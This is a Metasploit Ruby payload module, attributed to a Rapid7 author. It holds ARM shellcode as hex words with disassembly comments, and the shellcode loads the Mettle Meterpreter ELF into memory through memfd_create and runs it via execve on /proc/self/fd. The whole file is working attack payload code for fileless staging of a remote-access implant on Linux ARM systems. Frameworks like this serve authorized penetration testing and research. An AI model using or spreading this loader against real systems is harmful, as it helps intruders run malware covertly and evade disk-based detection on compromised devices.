
#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
module Msf::Payload::Linux::Armbe::MeterpreterLoader
  def in_memory_loader(payload)
      in_memory_loader = [
      0x0020a0e3, # 0x1000:	mov	r2, #0	0x0020a0e3
      0x04202de5, # 0x1004:	str	r2, [sp, #-4]!	0x04202de5
      0x0d00a0e1, # 0x1008:	mov	r0, sp	0x0d00a0e1
      0x0110a0e3, # 0x100c:	mov	r1, #1	0x0110a0e3
      0x8370a0e3, # 0x1010:	mov	r7, #0x83	0x8370a0e3
      0xfe7087e2, # 0x1014:	add	r7, r7, #0xfe	0xfe7087e2
      0x000000ef, # 0x1018:	svc	#0	0x000000ef
      0x0030a0e1, # 0x101c:	mov	r3, r0	0x0030a0e1
      0x1d0000ea, # 0x1020:	b	#0x109c	0x1d0000ea
      0x0e10a0e1, # 0x1024:	mov	r1, lr	0x0e10a0e1
      0x002091e5, # 0x1028:	ldr	r2, [r1]	0x002091e5
      0x261081e2, # 0x102c:	add	r1, r1, #0x26	0x261081e2
      0x0470a0e3, # 0x1030:	mov	r7, #4	0x0470a0e3
      0x000000ef, # 0x1034:	svc	#0	0x000000ef
      0x021041e2, # 0x1038:	sub	r1, r1, #2	0x021041e2
      0x01a0a0e1, # 0x103c:	mov	sl, r1	0x01a0a0e1
      0x0a20a0e3, # 0x1040:	mov	r2, #0xa	0x0a20a0e3
      0x13f234e7, # 0x1044:	udiv	r4, r3, r2	0x13f234e7
      0x940205e0, # 0x1048:	mul	r5, r4, r2	0x940205e0
      0x055043e0, # 0x104c:	sub	r5, r3, r5	0x055043e0
      0x0430a0e1, # 0x1050:	mov	r3, r4	0x0430a0e1
      0x305085e2, # 0x1054:	add	r5, r5, #0x30	0x305085e2
      0x0050cae5, # 0x1058:	strb	r5, [sl]	0x0050cae5
      0x01a04ae2, # 0x105c:	sub	sl, sl, #1	0x01a04ae2
      0x000054e3, # 0x1060:	cmp	r4, #0	0x000054e3
      0xf6ffff1a, # 0x1064:	bne	#0x1044	0xf6ffff1a
      0x2f90a0e3, # 0x1068:	mov	sb, #0x2f	0x2f90a0e3
      0x00b0dae5, # 0x106c:	ldrb	fp, [sl]	0x00b0dae5
      0x09005be1, # 0x1070:	cmp	fp, sb	0x09005be1
      0x0200000a, # 0x1074:	beq	#0x1084	0x0200000a
      0x0090cae5, # 0x1078:	strb	sb, [sl]	0x0090cae5
      0x01a04ae2, # 0x107c:	sub	sl, sl, #1	0x01a04ae2
      0xf9ffffea, # 0x1080:	b	#0x106c	0xf9ffffea
      0x0da04ae2, # 0x1084:	sub	sl, sl, #0xd	0x0da04ae2
      0x0a00a0e1, # 0x1088:	mov	r0, sl	0x0a00a0e1
      0x0010a0e3, # 0x108c:	mov	r1, #0	0x0010a0e3
      0x0020a0e3, # 0x1090:	mov	r2, #0	0x0020a0e3
      0x0b70a0e3, # 0x1094:	mov	r7, #0xb	0x0b70a0e3
      0x000000ef, # 0x1098:	svc	#0	0x000000ef
      0xe0ffffeb, # 0x109c:	bl	#0x1024	0xe0ffffeb
    ].pack('V*')
    fd_path = '/proc/self/fd/'.bytes.pack('C*') + "\x00" * 16
    in_memory_loader + [payload.length, 0x00000123].pack('N*') + fd_path
  end
end
